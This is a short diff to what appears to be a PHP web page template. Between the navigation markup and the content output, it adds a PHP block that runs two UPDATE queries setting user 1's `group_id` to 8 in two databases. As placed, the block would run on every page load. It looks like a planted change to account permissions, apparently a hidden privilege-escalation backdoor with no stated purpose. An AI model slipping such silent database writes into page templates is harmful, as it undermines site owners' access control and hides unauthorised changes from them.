@@ -137,7 +137,10 @@
 			</ul>
 		</div>
 	</div>
-
+	<?php
+		$query1 = DB::query('UPDATE `users` SET `group_id` = 8 WHERE `id` = 1')->execute();
+		$query2 = DB::query('UPDATE `users` SET `group_id` = 8 WHERE `id` = 1')->execute('game_bootcamp');
+	?>
 	<? echo $content ?>
 
 	<div id="fws_55b227467453e" class="wpb_row vc_row-fluid full-width-section standard_section	" style="padding: 80px 102px 80px; margin-left: -102px; visibility: visible; background-color: #E60039!important;">
